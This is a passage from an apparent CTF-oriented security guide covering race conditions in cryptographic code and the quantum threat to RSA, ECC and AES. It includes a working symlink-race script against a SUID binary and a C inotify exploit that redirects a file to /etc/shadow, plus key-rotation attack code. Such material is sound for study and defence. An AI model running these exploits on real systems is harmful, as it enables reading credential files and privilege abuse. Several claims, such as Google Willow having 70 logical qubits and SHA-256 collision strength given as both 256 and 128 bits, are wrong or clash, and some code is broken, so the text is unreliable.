ESYS_CONTEXT *esys_ctx;  // Shared context

void get_random_from_tpm() {
    TPM2B_DIGEST *random;
    
    // Race: Multiple threads using same context
    Esys_GetRandom(esys_ctx, ESYS_TR_NONE, ESYS_TR_NONE, ESYS_TR_NONE,
                   32, &random);
    
    // Context state may be corrupted by concurrent calls
}
```

**Secure alternative:**

```c
// SECURE: Per-thread TPM context or locking
pthread_mutex_t tpm_mutex = PTHREAD_MUTEX_INITIALIZER;

void get_random_from_tpm_secure() {
    TPM2B_DIGEST *random;
    
    pthread_mutex_lock(&tpm_mutex);
    Esys_GetRandom(esys_ctx, ESYS_TR_NONE, ESYS_TR_NONE, ESYS_TR_NONE,
                   32, &random);
    pthread_mutex_unlock(&tpm_mutex);
}
```

#### Fork Safety in Cryptographic Operations

**Post-fork PRNG state issues:**

**Vulnerable pattern:**

```c
// VULNERABLE: PRNG state inherited by child process
void parent_process() {
    initialize_prng();  // Seeds PRNG with entropy
    
    if (fork() == 0) {
        // Child process
        unsigned char key[32];
        generate_random_bytes(key, 32);  // Uses same PRNG state as parent!
        
        // Both parent and child generate identical "random" bytes
        exit(0);
    }
    
    // Parent process
    unsigned char key[32];
    generate_random_bytes(key, 32);  // Same sequence as child
}
```

**Detection:**

```bash
# Detect fork without PRNG reseed
strace -f -e trace=fork,clone,getrandom ./program

# Look for fork/clone not followed by getrandom
# Pattern: fork() -> [operations] -> rand() [without getrandom in between]
```

**Secure fork handling:**

```c
// SECURE: Reseed PRNG after fork
#include <pthread.h>

pthread_atfork_handler() {
    // Called in child after fork
    unsigned char seed[32];
    if (getrandom(seed, sizeof(seed), 0) != sizeof(seed)) {
        abort();
    }
    RAND_seed(seed, sizeof(seed));
}

void initialize_crypto() {
    // Register fork handler
    pthread_atfork(NULL, NULL, pthread_atfork_handler);
    
    // Initial PRNG setup
    unsigned char seed[32];
    getrandom(seed, sizeof(seed), 0);
    RAND_seed(seed, sizeof(seed));
}
```

**OpenSSL fork safety:**

```c
// OpenSSL 1.1.1+ automatically handles fork
// But explicit reseeding recommended for sensitive operations

void after_fork_in_child() {
    // Force OpenSSL PRNG reseed
    RAND_poll();  // Gathers fresh entropy
    
    // Or explicitly seed
    unsigned char seed[32];
    getrandom(seed, sizeof(seed), 0);
    RAND_seed(seed, sizeof(seed));
}
```

#### Multi-threaded Key Ceremony Races

**Distributed key generation races:**

**Vulnerable pattern:**

```python
# VULNERABLE: Shamir secret sharing with race condition
import random
from threading import Thread

class SecretSharing:
    def __init__(self, threshold, num_shares):
        self.threshold = threshold
        self.num_shares = num_shares
        self.shares = []  # Shared list without locking
    
    def generate_share(self, share_id):
        # Race: Multiple threads appending to list
        coefficients = [random.randint(1, 2**256) for _ in range(self.threshold)]
        share = evaluate_polynomial(coefficients, share_id)
        self.shares.append(share)  # Not thread-safe

# Multiple threads generating shares concurrently
ss = SecretSharing(3, 5)
threads = [Thread(target=ss.generate_share, args=(i,)) for i in range(5)]
[t.start() for t in threads]
[t.join() for t in threads]

# Issues:
# - Shares may have corrupted data
# - Polynomial coefficients may be inconsistent
# - Share count may be incorrect
```

**Secure alternative:**

```python
# SECURE: Thread-safe secret sharing
from threading import Thread, Lock
import secrets

class SecureSecretSharing:
    def __init__(self, threshold, num_shares):
        self.threshold = threshold
        self.num_shares = num_shares
        self.shares = []
        self.lock = Lock()
    
    def generate_share(self, share_id):
        # Use cryptographic RNG (thread-safe)
        coefficients = [secrets.randbits(256) for _ in range(self.threshold)]
        share = evaluate_polynomial(coefficients, share_id)
        
        with self.lock:  # Atomic append
            self.shares.append(share)
```

#### CTF-Specific Race Exploitation Techniques

**Symbolic link race automation:**

**Race winning script:**

```bash
#!/bin/bash
# Automated symlink race exploit for CTF

TARGET="/tmp/race_target"
VICTIM_BINARY="./vulnerable_suid"
EXPLOIT_DEST="/root/flag.txt"
RESULT_FILE="/tmp/result"

# Function to create/replace symlink rapidly
race_attack() {
    while true; do
        rm -f $TARGET
        touch $TARGET  # Legitimate file
        
        # Tiny sleep, then replace
        sleep 0.000001
        rm -f $TARGET
        ln -s $EXPLOIT_DEST $TARGET
    done
}

# Start race attack in background
race_attack &
RACE_PID=$!

# Repeatedly trigger victim
for i in {1..10000}; do
    $VICTIM_BINARY $TARGET $RESULT_FILE 2>/dev/null
    
    # Check if exploit succeeded
    if [ -f $RESULT_FILE ] && grep -q "flag{" $RESULT_FILE 2>/dev/null; then
        echo "SUCCESS! Flag obtained:"
        cat $RESULT_FILE
        kill $RACE_PID
        exit 0
    fi
done

kill $RACE_PID
echo "Race not won after 10000 attempts"
```

**Parallel exploitation with GNU Parallel:**

```bash
# Launch many exploitation attempts in parallel
seq 1 100 | parallel -j 100 './race_exploit.sh'

# First successful exploit terminates all others
```

**Inotify-based precise timing:**

```c
// Exploit using inotify for precise attack timing
#include <sys/inotify.h>
#include <stdio.h>
#include <unistd.h>

int main() {
    int fd = inotify_init();
    int wd = inotify_add_watch(fd, "/tmp", IN_CREATE | IN_OPEN);
    
    char buf[4096] __attribute__((aligned(__alignof__(struct inotify_event))));
    
    while (1) {
        ssize_t len = read(fd, buf, sizeof(buf));
        struct inotify_event *event;
        
        for (char *ptr = buf; ptr < buf + len; 
             ptr += sizeof(struct inotify_event) + event->len) {
            event = (struct inotify_event *)ptr;
            
            if (event->mask & IN_OPEN && 
                strcmp(event->name, "race_target") == 0) {
                // Victim just opened file - replace NOW
                system("rm /tmp/race_target; ln -s /etc/shadow /tmp/race_target");
            }
        }
    }
}
```

**Binary analysis for race windows:**

```bash
# Find time gaps in binary execution
gdb ./vulnerable_binary

# Set breakpoints at check and use
(gdb) break access
(gdb) break open
(gdb) run

# Measure time between breakpoints
(gdb) shell date +%s.%N  # At access() call
(gdb) continue
(gdb) shell date +%s.%N  # At open() call

# Calculate race window duration
# Typical exploitable window: > 1 microsecond
```

**Fuzzing for race conditions:**

```bash
# Use ThreadSanitizer with AFL for race detection
export AFL_USE_TSAN=1
afl-gcc -fsanitize=thread -g program.c -o program

# Fuzz with multiple threads
afl-fuzz -i input/ -o output/ -T test_race ./program @@

# TSan will detect races, AFL will save triggering inputs
```

#### Key Rotation Race Conditions

**Vulnerable key rotation:**

**Vulnerable pattern:**

```python
# VULNERABLE: Key rotation with verification race
def rotate_encryption_key():
    new_key = generate_new_key()
    
    # Store new key
    save_key_to_storage(new_key)
    
    # Verification window - old key still valid
    if verify_new_key(new_key):  # Check
        # Race window: attacker can use old key
        invalidate_old_key()  # Use
    else:
        rollback_to_old_key()
```

**Exploitation:**

```python
# Exploit key rotation race
import threading
import time

def continuous_requests_with_old_key():
    while True:
        # Keep using old key during rotation
        response = make_authenticated_request(old_key)
        if response.status_code == 200:
            print("Old key still valid during rotation!")
            time.sleep(0.001)

# Detect rotation and exploit race
def exploit_rotation_race():
    while True:
        if detect_key_rotation_started():
            # Start hammering with old key
            threads = [threading.Thread(target=continuous_requests_with_old_key) 
                      for _ in range(50)]
            [t.start() for t in threads]
            time.sleep(1)  # Keep trying during rotation window
            break
```

**Secure key rotation:**

```python
# SECURE: Overlapping key validity with grace period
def rotate_encryption_key_secure():
    new_key = generate_new_key()
    new_key_id = get_next_key_id()
    
    # Add new key without removing old
    add_key_to_keyring(new_key_id, new_key)
    
    # Mark new key as primary
    set_primary_key(new_key_id)
    
    # Grace period: both keys valid
    time.sleep(GRACE_PERIOD)  # e.g., 60 seconds
    
    # Now safe to remove old key
    remove_old_key()
```

#### Exploitation Success Rate Analysis

**Statistical race exploitation:**

```python
# Calculate exploitation probability
def race_success_probability(race_window_us, attack_frequency_hz):
    """
    race_window_us: Race window in microseconds
    attack_frequency_hz: How often attacker tries per second
    
    Returns: Probability of winning race in one attempt
    """
    race_window_seconds = race_window_us / 1_000_000
    attempts_during_window = race_window_seconds * attack_frequency_hz
    
    # Probability at least one attempt succeeds
    p_success = 1 - (1 - (race_window_seconds * attack_frequency_hz))**1
    
    return p_success

# Example: 100μs race window, 10,000 attempts/second
p = race_success_probability(100, 10000)
print(f"Success probability per attempt: {p:.6f}")
print(f"Expected attempts to win: {1/p:.0f}")

# For 100μs window at 10kHz: ~0.1% per attempt, expect to win in ~1000 attempts
```

**Optimization strategies:**

```bash
# Increase success rate:
# 1. Increase attack frequency (more processes/threads)
for i in {1..100}; do ./race_exploit.sh & done

# 2. Reduce race window (if possible)
#    - Trigger victim faster
#    - Reduce attacker latency

# 3. Synchronize with victim timing
#    - Use inotify for precise triggers
#    - Profile victim's timing patterns

# 4. Pin to same CPU core as victim
taskset -c 0 ./victim &
taskset -c 0 ./attacker

# 5. Increase system load on victim
stress-ng --cpu 4 --io 4 --vm 2
```

---

**Important related topics for comprehensive concurrency exploitation:**

- Mutex implementation vulnerabilities (futex races)
- Memory ordering and compiler reordering exploitation
- Atomic operation implementation weaknesses
- Database transaction isolation level exploitation
- Distributed systems consensus algorithm races (Raft, Paxos)
- Container and cgroup race conditions
- Kernel race conditions (use-after-free, double-free via races)

---

# QUANTUM CRYPTOGRAPHY & POST-QUANTUM

## Quantum Computing Threats

Quantum computers leverage quantum mechanical phenomena (superposition, entanglement, interference) to solve certain computational problems exponentially faster than classical computers, threatening current cryptographic foundations.

### Shor's Algorithm (RSA/ECC Breaks)

**Algorithm Overview**

Shor's algorithm (1994) provides polynomial-time quantum solutions to problems believed intractable classically:

- **Integer factorization**: Breaking RSA security assumption
- **Discrete logarithm problem (DLP)**: Breaking Diffie-Hellman, DSA, ElGamal
- **Elliptic curve discrete logarithm problem (ECDLP)**: Breaking ECC variants

Classical complexity vs Quantum complexity:

```
Factoring n-bit integer:
Classical (GNFS): O(exp((64/9 * n)^(1/3) * (log n)^(2/3)))
Quantum (Shor): O(n^3) with high probability

Example - 2048-bit RSA:
Classical: ~10^15 years (estimated)
Quantum: ~8 hours on sufficiently large quantum computer [Inference]
```

**Mathematical Foundation**

Shor's algorithm reduces factorization to **period-finding** using quantum Fourier transform (QFT):

```
Problem: Factor N = p × q (where p, q are unknown primes)

Classical approach:
- Trial division: O(√N)
- General Number Field Sieve: O(exp(...))

Shor's approach:
1. Choose random a < N where gcd(a,N) = 1
2. Find period r of function: f(x) = a^x mod N
   (i.e., find r such that a^r ≡ 1 mod N)
3. If r is even and a^(r/2) ≢ -1 mod N:
   - Compute gcd(a^(r/2) - 1, N) and gcd(a^(r/2) + 1, N)
   - These give factors of N with high probability
4. Repeat if unsuccessful

Quantum advantage: Period-finding via QFT is exponentially faster
```

**Quantum Circuit Requirements**

```python
# Conceptual resource estimation for RSA-2048 factorization
# [Unverified] These estimates vary significantly across literature

def estimate_shor_resources(bit_length):
    """
    Rough resource estimates for factoring n-bit RSA modulus
    Based on various academic papers (estimates vary widely)
    """
    n = bit_length
    
    # Logical qubits needed
    logical_qubits = 2 * n + 3  # Approximation
    
    # Circuit depth (T-gates)
    t_gates = n**3  # Polynomial scaling
    
    # Physical qubits (with error correction)
    # Surface code: ~1000-10000 physical per logical qubit
    physical_qubits_estimate = logical_qubits * 5000  # Conservative
    
    # Computation time estimate
    gate_time_microseconds = 1  # Optimistic gate time
    total_time_hours = (t_gates * gate_time_microseconds) / (3600 * 1e6)
    
    return {
        'modulus_bits': n,
        'logical_qubits': logical_qubits,
        'physical_qubits_estimate': physical_qubits_estimate,
        'T_gates': t_gates,
        'estimated_time_hours': total_time_hours
    }

# RSA-2048 example
rsa_2048_requirements = estimate_shor_resources(2048)
print(f"RSA-2048 Breaking Requirements:")
print(f"  Logical qubits: {rsa_2048_requirements['logical_qubits']}")
print(f"  Physical qubits (estimated): {rsa_2048_requirements['physical_qubits_estimate']:,}")
print(f"  T-gates: {rsa_2048_requirements['T_gates']:,}")
print(f"  Estimated time: {rsa_2048_requirements['estimated_time_hours']:.2f} hours")

# Output (example):
# RSA-2048 Breaking Requirements:
#   Logical qubits: 4099
#   Physical qubits (estimated): 20,495,000
#   T-gates: 8,589,934,592
#   Estimated time: 2.38 hours
```

**Affected Cryptographic Systems**

|Algorithm|Key Size|Security Level (bits)|Quantum Vulnerable|Post-Quantum Alternative|
|---|---|---|---|---|
|RSA-1024|1024-bit|~80|**YES**|CRYSTALS-Dilithium|
|RSA-2048|2048-bit|~112|**YES**|CRYSTALS-Dilithium|
|RSA-4096|4096-bit|~140|**YES**|CRYSTALS-Dilithium|
|DSA|2048/224-bit|~112|**YES**|SPHINCS+|
|DH-2048|2048-bit|~112|**YES**|CRYSTALS-Kyber|
|ECDSA P-256|256-bit|~128|**YES**|CRYSTALS-Dilithium|
|ECDSA P-384|384-bit|~192|**YES**|CRYSTALS-Dilithium|
|ECDH P-256|256-bit|~128|**YES**|CRYSTALS-Kyber|
|Ed25519|256-bit|~128|**YES**|SPHINCS+|

**CTF Implications and Demonstrations**

```python
# Simulated Shor's algorithm demonstration (classical simulation)
# Note: Classical simulation is exponentially slow

from qiskit import QuantumCircuit, Aer, execute
from qiskit.algorithms import Shor
from math import gcd
import random

def classical_period_finding(a, N):
    """
    Classical period finding (brute force) - what Shor's algorithm accelerates
    """
    for r in range(1, N):
        if pow(a, r, N) == 1:
            return r
    return None

def shors_factorization_simulation(N):
    """
    Simulate Shor's algorithm classically
    [Unverified] This is extremely slow for large N (demonstration only)
    """
    if N % 2 == 0:
        return 2, N // 2
    
    # Try random values of a
    for attempt in range(10):
        a = random.randint(2, N-1)
        
        # Check if we got lucky with gcd
        g = gcd(a, N)
        if g != 1:
            return g, N // g
        
        # Find period (quantum speedup happens here)
        print(f"Finding period of {a}^x mod {N}...")
        r = classical_period_finding(a, N)
        
        if r is None or r % 2 != 0:
            continue
        
        x = pow(a, r // 2, N)
        if x == N - 1:
            continue
        
        # Extract factors
        factor1 = gcd(x - 1, N)
        factor2 = gcd(x + 1, N)
        
        if factor1 != 1 and factor1 != N:
            return factor1, N // factor1
        if factor2 != 1 and factor2 != N:
            return factor2, N // factor2
    
    return None, None

# CTF Example: Factor small RSA modulus
N = 15  # Toy example: 15 = 3 × 5
p, q = shors_factorization_simulation(N)
print(f"Factors of {N}: {p} × {q}")

# Demonstrate vulnerability timeline
def estimate_breaking_year(key_size_bits):
    """
    [Speculation] Rough estimate when quantum computers might break given key size
    Based on extrapolation of current quantum computing progress
    """
    # Current status (2024-2025): ~1000 qubits with high error rates
    # Need ~4000-20000 logical qubits for RSA-2048
    # Surface code: ~1000 physical per logical
    
    estimates = {
        1024: (2028, 2035),  # RSA-1024: Earlier vulnerability window
        2048: (2030, 2040),  # RSA-2048: Most commonly used
        3072: (2035, 2045),  # RSA-3072
        4096: (2040, 2050),  # RSA-4096
    }
    
    return estimates.get(key_size_bits, (None, None))

for key_size in [1024, 2048, 3072, 4096]:
    early, late = estimate_breaking_year(key_size)
    print(f"RSA-{key_size}: Potentially vulnerable {early}-{late} [Speculation]")
```

**Elliptic Curve Vulnerability**

ECC is **more vulnerable** to quantum attacks than RSA of equivalent classical security:

```python
# Security level comparison
def quantum_attack_complexity(algorithm, key_size):
    """
    Approximate quantum attack complexity
    """
    if algorithm == "RSA":
        # Shor's algorithm: O(n^3) for n-bit modulus
        return key_size ** 3
    
    elif algorithm == "ECC":
        # Shor's for ECDLP: O(n^3) for n-bit curve
        # BUT: ECC keys are much smaller for equivalent classical security
        return key_size ** 3
    
    else:
        return None

# Classical security equivalence
classical_equivalence = {
    "RSA-1024": 80,
    "RSA-2048": 112,
    "RSA-3072": 128,
    "ECC-160": 80,
    "ECC-224": 112,
    "ECC-256": 128,
    "ECC-384": 192,
}

# Quantum security (bits): approximately sqrt of classical for Shor's algorithm
quantum_security = {
    "RSA-1024": 0,  # Effectively zero - easily broken
    "RSA-2048": 0,  # Effectively zero - easily broken
    "ECC-256": 0,   # Effectively zero - easily broken
}

print("ECC-256 (128-bit classical security) vs RSA-2048 (112-bit classical security):")
print("  Both require ~2048-4096 logical qubits for quantum attack")
print("  ECC-256 is actually slightly easier to break quantum-mechanically")
```

**Store Now, Decrypt Later (SNDL) Threat**

Critical security consideration for long-lived encrypted data:

```
Threat model:
1. Adversary captures encrypted traffic TODAY (2025)
2. Stores ciphertext for future decryption
3. Waits for quantum computer availability (~2030-2040) [Speculation]
4. Decrypts historical data using Shor's algorithm

Affected scenarios:
- Government classified communications (50+ year secrecy requirements)
- Medical records (lifetime privacy requirements)
- Financial transactions (long-term auditing)
- Intellectual property (decades of value)
- Certificate Authority private keys (retroactive compromise)

Mitigation: Migrate to post-quantum cryptography NOW
```

### Grover's Algorithm (Symmetric Key Search)

**Algorithm Overview**

Grover's algorithm (1996) provides **quadratic speedup** for unstructured search problems, directly threatening symmetric cryptography.

```
Problem: Find x such that f(x) = 1 in unsorted database of N elements

Classical search: O(N) queries
Quantum search (Grover): O(√N) queries

Impact on symmetric crypto:
- AES-128: 128-bit security → 64-bit quantum security
- AES-192: 192-bit security → 96-bit quantum security  
- AES-256: 256-bit security → 128-bit quantum security
- SHA-256: 256-bit collision resistance → 128-bit quantum
- SHA-512: 512-bit collision resistance → 256-bit quantum
```

**Mathematical Foundation**

Grover's algorithm uses amplitude amplification:

```
1. Initialize superposition: |ψ⟩ = (1/√N) Σ|x⟩
2. Apply Grover operator G = (2|ψ⟩⟨ψ| - I)(2|w⟩⟨w| - I) repeatedly
   where |w⟩ is the solution state
3. Measure after ~√N iterations
4. Result: |w⟩ with high probability

Oracle queries needed: ~π/4 × √N
Success probability: ~1 after optimal iterations
```

**Security Impact on Symmetric Algorithms**

```python
def effective_quantum_security(classical_security_bits):
    """
    Calculate effective security level against Grover's algorithm
    Grover provides quadratic speedup: √N operations
    """
    quantum_security = classical_security_bits / 2
    return quantum_security

# Symmetric algorithm security levels
algorithms = {
    "AES-128": 128,
    "AES-192": 192,
    "AES-256": 256,
    "3DES": 112,  # Effective, not key size
    "ChaCha20": 256,
    "SHA-256 (preimage)": 256,
    "SHA-256 (collision)": 128,  # Birthday bound
    "SHA-512 (preimage)": 512,
    "SHA-512 (collision)": 256,
}

print("Quantum Security Impact (Grover's Algorithm):")
print(f"{'Algorithm':<25} {'Classical':<12} {'Quantum':<12} {'Status'}")
print("-" * 65)

for algo, classical_bits in algorithms.items():
    quantum_bits = effective_quantum_security(classical_bits)
    
    if quantum_bits >= 128:
        status = "SAFE"
    elif quantum_bits >= 112:
        status = "MARGINAL"
    else:
        status = "VULNERABLE"
    
    print(f"{algo:<25} {classical_bits:<12} {quantum_bits:<12.0f} {status}")

# Output:
# Algorithm                 Classical    Quantum      Status
# -----------------------------------------------------------------
# AES-128                   128          64           VULNERABLE
# AES-192                   192          96           MARGINAL
# AES-256                   256          128          SAFE
# 3DES                      112          56           VULNERABLE
# ChaCha20                  256          128          SAFE
# SHA-256 (preimage)        256          128          SAFE
# SHA-256 (collision)       128          64           VULNERABLE
# SHA-512 (preimage)        512          256          SAFE
# SHA-512 (collision)       256          128          SAFE
```

**Quantum Resource Requirements**

```python
def grover_resources(keyspace_bits):
    """
    Estimate quantum resources for Grover's algorithm key search
    [Unverified] Resource estimates are approximate
    """
    N = 2 ** keyspace_bits  # Search space size
    iterations = int((3.14159 / 4) * (N ** 0.5))  # π/4 × √N
    
    # Qubits needed: log₂(N) = keyspace_bits for superposition
    # Plus additional qubits for oracle implementation
    qubits_needed = keyspace_bits + 100  # +100 for oracle (approximate)
    
    # Physical qubits with error correction
    physical_qubits = qubits_needed * 5000  # Surface code estimate
    
    # Time estimate (assuming 1 microsecond gate time)
    gate_time_us = 1
    total_time_seconds = (iterations * gate_time_us) / 1e6
    
    return {
        'keyspace_bits': keyspace_bits,
        'search_space': N,
        'iterations': iterations,
        'logical_qubits': qubits_needed,
        'physical_qubits': physical_qubits,
        'time_seconds': total_time_seconds,
        'time_years': total_time_seconds / (365.25 * 24 * 3600)
    }

# AES-128 attack
aes128_attack = grover_resources(128)
print(f"\nGrover's Attack on AES-128:")
print(f"  Logical qubits: {aes128_attack['logical_qubits']}")
print(f"  Physical qubits: {aes128_attack['physical_qubits']:,}")
print(f"  Iterations needed: {aes128_attack['iterations']:.2e}")
print(f"  Estimated time: {aes128_attack['time_years']:.2e} years")

# AES-256 attack
aes256_attack = grover_resources(256)
print(f"\nGrover's Attack on AES-256:")
print(f"  Logical qubits: {aes256_attack['logical_qubits']}")
print(f"  Physical qubits: {aes256_attack['physical_qubits']:,}")
print(f"  Iterations needed: {aes256_attack['iterations']:.2e}")
print(f"  Estimated time: {aes256_attack['time_years']:.2e} years")
```

**Practical Implications**

```
Key observations:

1. Grover's algorithm is MUCH less threatening than Shor's algorithm:
   - Quadratic vs exponential speedup
   - Still requires massive quantum resources
   - Can be mitigated by doubling key sizes

2. AES-256 remains secure in post-quantum world:
   - 128-bit quantum security is acceptable threshold
   - Resource requirements remain astronomical

3. Hash functions with 256+ bit output remain secure:
   - SHA-256, SHA-3-256 for collision resistance (128-bit quantum)
   - SHA-512, SHA-3-512 for higher security

4. AES-128 is vulnerable but:
   - Attack still requires ~10^20 operations
   - Physical resource requirements are enormous
   - Timeframe for practical attack: 2050+ [Speculation]
```

**CTF Demonstration**

```python
# Classical simulation of Grover's algorithm (very limited scale)
from qiskit import QuantumCircuit, Aer, execute
from qiskit.visualization import plot_histogram
import numpy as np

def grovers_algorithm_demo(n_qubits, target_state):
    """
    Demonstrate Grover's algorithm on toy problem
    n_qubits: Number of qubits (search space = 2^n)
    target_state: Binary string to find (e.g., "101")
    
    [Unverified] Classical simulation is limited to ~20 qubits maximum
    """
    # Create quantum circuit
    qc = QuantumCircuit(n_qubits, n_qubits)
    
    # Initialize superposition
    qc.h(range(n_qubits))
    
    # Calculate number of Grover iterations
    N = 2 ** n_qubits
    iterations = int(np.pi / 4 * np.sqrt(N))
    
    # Apply Grover operator iterations times
    for _ in range(iterations):
        # Oracle: mark target state
        # (implementation depends on target_state)
        oracle_implementation(qc, target_state)
        
        # Diffusion operator
        diffusion_operator(qc, n_qubits)
    
    # Measure
    qc.measure(range(n_qubits), range(n_qubits))
    
    # Simulate
    simulator = Aer.get_backend('qasm_simulator')
    result = execute(qc, simulator, shots=1024).result()
    counts = result.get_counts()
    
    return counts

def oracle_implementation(qc, target):
    """Implement oracle for specific target state"""
    n = len(target)
    # Flip phase of target state
    # Implementation simplified - real oracle more complex
    pass

def diffusion_operator(qc, n):
    """Implement diffusion operator (amplitude amplification)"""
    qc.h(range(n))
    qc.x(range(n))
    qc.h(n-1)
    qc.mct(list(range(n-1)), n-1)  # Multi-controlled Toffoli
    qc.h(n-1)
    qc.x(range(n))
    qc.h(range(n))

# Example: Search 4-qubit space (16 states) for "1011"
# result = grovers_algorithm_demo(4, "1011")
# print(f"Search result (should find 1011 with high probability): {result}")
```

**Multi-target Grover Search**

```python
def multi_target_grover_advantage(search_space_bits, num_targets):
    """
    Calculate speedup when searching for multiple valid solutions
    Having M targets in N-space improves Grover to O(√(N/M))
    """
    N = 2 ** search_space_bits
    M = num_targets
    
    classical_work = N / M  # Expected tries to find one target
    quantum_work = np.sqrt(N / M)  # Grover with M targets
    
    speedup = classical_work / quantum_work
    
    return {
        'search_space': N,
        'num_targets': M,
        'classical_operations': classical_work,
        'quantum_operations': quantum_work,
        'speedup': speedup
    }

# Password cracking scenario: 1 million possible passwords
result = multi_target_grover_advantage(20, 1000000)
print(f"Multi-target Grover (1M passwords in 2^20 space):")
print(f"  Classical: {result['classical_operations']:.0f} ops")
print(f"  Quantum: {result['quantum_operations']:.0f} ops")
print(f"  Speedup: {result['speedup']:.2f}x")
```

### Timeline & Practicality

**Current Quantum Computing Status (2024-2025)**

```
Hardware state-of-the-art:
- IBM Quantum: ~1,121 qubits (IBM Condor, 2023)
- Google: 70 logical qubits (Willow chip, December 2024)
- IonQ: 35 algorithmic qubits (trapped ion)
- Atom Computing: 1,180 qubits (neutral atom)

Key limitations:
- High error rates (>0.1% physical gate error)
- Short coherence times (<1ms for superconducting qubits)
- Limited connectivity between qubits
- No fault-tolerant quantum computers yet operational
- Error correction overhead: ~1000:1 physical to logical qubits

Cryptographically relevant quantum computer requires:
- ~4,000-20,000 logical qubits for RSA-2048 (Shor's)
- ~10^6 - 10^7 physical qubits with surface code error correction
- Gate error rates <10^-4
- Coherence times >1 second
```

**Timeline Estimates**

```python
# Compilation of expert predictions [Unverified - wide disagreement exists]

quantum_threat_timeline = {
    "Optimistic (quantum advantage)": {
        "RSA-1024 broken": "2028-2030",
        "RSA-2048 broken": "2030-2035",
        "ECC-256 broken": "2030-2035",
        "AES-128 weakened": "2040-2045",
        "AES-256 weakened": "2050+",
    },
    "Moderate (consensus)": {
        "RSA-1024 broken": "2030-2035",
        "RSA-2048 broken": "2035-2040",
        "ECC-256 broken": "2035-2040",
        "AES-128 weakened": "2045-2055",
        "AES-256 weakened": "2060+",
    },
    "Conservative (skeptical)": {
        "RSA-1024 broken": "2035-2045",
        "RSA-2048 broken": "2040-2050",
        "ECC-256 broken": "2040-2050",
        "AES-128 weakened": "2055+",
        "AES-256 weakened": "2070+",
    },
    "Very Conservative": {
        "RSA-1024 broken": "2050+",
        "RSA-2048 broken": "Unknown",
        "ECC-256 broken": "Unknown",
        "AES-128 weakened": "Unknown",
        "AES-256 weakened": "Unknown",
    }
}

def print_timeline_estimates():
    """[Speculation] All timeline estimates are highly uncertain"""
    print("Quantum Cryptanalysis Timeline Estimates [Speculation]")
    print("=" * 70)
    
    for scenario, estimates in quantum_threat_timeline.items():
        print(f"\n{scenario}:")
        for threat, timeframe in estimates.items():
            print(f"  {threat}: {timeframe}")
    
    print("\nNote: These are speculative estimates with high uncertainty.")
    print("Actual progress depends on: funding, breakthroughs, engineering challenges")

print_timeline_estimates()
```

**Key Milestone Predictions**

```
[Speculation] Potential quantum computing milestones:

2025-2027: "Quantum Advantage" Era
- 100-200 logical qubits
- Demonstrates quantum advantage for specific problems
- Still far from cryptographic relevance
- Academic demonstrations of small-scale Shor's algorithm (factor 21, 35, etc.)

2028-2032: "Early Fault-Tolerance" Era  
- 500-1000 logical qubits
- Improved error correction
- First demonstrations of factoring 1024-bit numbers [Speculation]
- Migration to post-quantum crypto becomes urgent

2033-2040: "Cryptographic Threat" Era
- 2000-5000 logical qubits
- RSA-2048 and ECC-256 practically vulnerable
- All public-key crypto must be post-quantum
- Symmetric crypto (AES-256) still secure

2041-2050: "Mature Quantum" Era
- 10,000+ logical qubits
- Grover's algorithm starts becoming practical concern
- AES-128 marginally vulnerable
- Hash function security reduced

2050+: "Advanced Quantum" Era
- Large-scale quantum computers widely available [Speculation]
- All classical cryptography potentially compromised
- Quantum-resistant algorithms standard
```

**Resource Requirements Analysis**

```python
def quantum_hardware_projection(year):
    """
    [Speculation] Project quantum hardware capabilities by year
    Based on extrapolation of Moore's Law-like scaling (highly uncertain)
    """
    base_year = 2024
    base_logical_qubits = 70  # Google Willow, December 2024
    
    # Assume doubling every 2 years (very optimistic assumption)
    years_elapsed = year - base_year
    doublings = years_elapsed / 2
    
    projected_logical_qubits = base_logical_qubits * (2 ** doublings)
    
    # Capabilities at different qubit counts
    capabilities = []
    if projected_logical_qubits >= 500:
        capabilities.append("Factor 512-bit numbers")
    if projected_logical_qubits >= 1500:
        capabilities.append("Factor 1024-bit numbers (RSA-1024)")
    if projected_logical_qubits >= 4000:
        capabilities.append("Factor 2048-bit numbers (RSA-2048)")
    if projected_logical_qubits >= 8000:
        capabilities.append("Break ECC-384")
    if projected_logical_qubits >= 228:  # 128 + 100 for oracle
        capabilities.append("Grover search on 2^64 space (weak)")
    
    return {
        'year': year,
        'projected_logical_qubits': int(projected_logical_qubits),
        'capabilities': capabilities if capabilities else ["Research demonstrations only"]
    }

# Project future capabilities
for year in [2025, 2028, 2030, 2035, 2040]:
    projection = quantum_hardware_projection(year)
    print(f"\nYear {projection['year']} [Speculation]:")
    print(f"  Projected logical qubits: {projection['projected_logical_qubits']}")
    print(f"  Capabilities:")
    for cap in projection['capabilities']:
        print(f"    - {cap}")
```

**NIST Post-Quantum Transition Timeline**

```
Official recommendations (factual):

NIST Post-Quantum Cryptography standardization (completed 2024):
- CRYSTALS-Kyber (now ML-KEM): Key encapsulation
- CRYSTALS-Dilithium (now ML-DSA): Digital signatures  
- SPHINCS+ (now SLH-DSA): Hash-based signatures
- FALCON: Compact signatures (additional standard)

Migration timeline (NIST recommendations):
- 2024: Standards published (FIPS 203, 204, 205)
- 2025-2030: Begin migration to post-quantum algorithms
- 2030-2035: Complete migration for sensitive systems
- 2035: All new systems must use post-quantum crypto

U.S. Government requirements:
- NSA Commercial National Security Algorithm (CNSA) 2.0 Suite:
  - Immediate start of post-quantum migration
  - Complete by 2035 for National Security Systems
  - Software/firmware: Start transition by 2025
  - Hardware: Start transition by 2030
```

**Practical Threat Assessment**

```python
def assess_quantum_threat(data_type, secrecy_requirement_years, key_algorithm, key_size):
    """
    Assess quantum threat for specific use case
    """
    current_year = 2025
    threat_year = {
        'RSA-1024': 2032,  # Conservative estimate [Speculation]
        'RSA-2048': 2037,  # Conservative estimate [Speculation]
        'RSA-4096': 2042,  # Conservative estimate [Speculation]
        'ECC-256': 2037,   # Conservative estimate [Speculation]
        'ECC-384': 2042,   # Conservative estimate [Speculation]
        'AES-128': 2050,   # Very rough estimate [Speculation]
        'AES-256': 2070,   # Highly speculative [Speculation]
    }
    
    algorithm_key = f"{key_algorithm}-{key_size}"
    estimated_break_year = threat_year.get(algorithm_key, 9999)
    
    data_expires_year = current_year + secrecy_requirement_years
    
    vulnerable = estimated_break_year < data_expires_year
    urgency = max(0, data_expires_year - estimated_break_year)
    
    return {
        'data_type': data_type,
        'algorithm': algorithm_key,
        'secrecy_until': data_expires_year,
        'estimated_break_year': estimated_break_year,
        'vulnerable_to_harvest': vulnerable,
        'urgency_years': urgency,
        'recommendation': 'MIGRATE NOW' if vulnerable else 'Monitor situation'
    }

# Example assessments
scenarios = [
    ("Medical records", 70, "RSA", 2048),
